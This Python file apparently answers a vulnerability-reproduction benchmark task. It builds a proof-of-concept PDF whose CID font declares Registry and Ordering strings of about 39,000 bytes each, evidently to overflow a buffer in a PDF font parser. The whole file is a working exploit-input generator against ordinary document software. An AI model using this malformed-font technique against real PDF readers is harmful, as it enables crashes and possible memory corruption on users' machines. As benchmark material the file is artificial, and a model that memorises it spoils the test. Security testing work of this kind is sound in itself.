import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        
        payload_half_len = 39485
        registry_str = b'(' + b'A' * payload_half_len + b')'
        ordering_str = b'(' + b'B' * payload_half_len + b')'

        objects = []
        
        objects.append(b'1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj')
        objects.append(b'2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj')
        objects.append(b'3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 1 1]/Resources<</Font<</F1 4 0 R>>>>>>endobj')
        objects.append(b'4 0 obj<</Type/Font/Subtype/Type0/BaseFont/PocFont/Encoding/Identity-H/DescendantFonts[5 0 R]>>endobj')
        
        obj5 = (b'5 0 obj'
                b'<</Type/Font/Subtype/CIDFontType0'
                b'/BaseFont/PocCidFont'
                b'/CIDSystemInfo<</Registry' + registry_str +
                b'/Ordering' + ordering_str +
                b'/Supplement 0>>'
                b'/FontDescriptor 6 0 R/DW 1000>>'
                b'endobj')
        objects.append(obj5)
        
        objects.append(b'6 0 obj<</Type/FontDescriptor/FontName/PocFd/Flags 4/FontBBox[0 0 0 0]/Ascent 1/Descent 0/CapHeight 1/StemV 1>>endobj')
        
        body_parts = [b'%PDF-1.7\n']
        offsets = []
        current_offset = len(body_parts[0])
        
        for obj in objects:
            offsets.append(current_offset)
            part = obj + b'\n'
            body_parts.append(part)
            current_offset += len(part)
            
        xref_offset = current_offset
        
        num_entries = len(objects) + 1
        
        xref_table_parts = [
            f'xref\n0 {num_entries}\n'.encode('ascii'),
            b'0000000000 65535 f \n'
        ]
        for offset in offsets:
            xref_table_parts.append(f'{offset:010d} 00000 n \n'.encode('ascii'))
        
        trailer = f'trailer\n<</Size {num_entries}/Root 1 0 R>>\n'.encode('ascii')
        startxref = f'startxref\n{xref_offset}\n'.encode('ascii')
        eof = b'%%EOF'
        
        poc_components = [
            b''.join(body_parts),
            b''.join(xref_table_parts),
            trailer,
            startxref,
            eof
        ]
        
        return b''.join(poc_components)
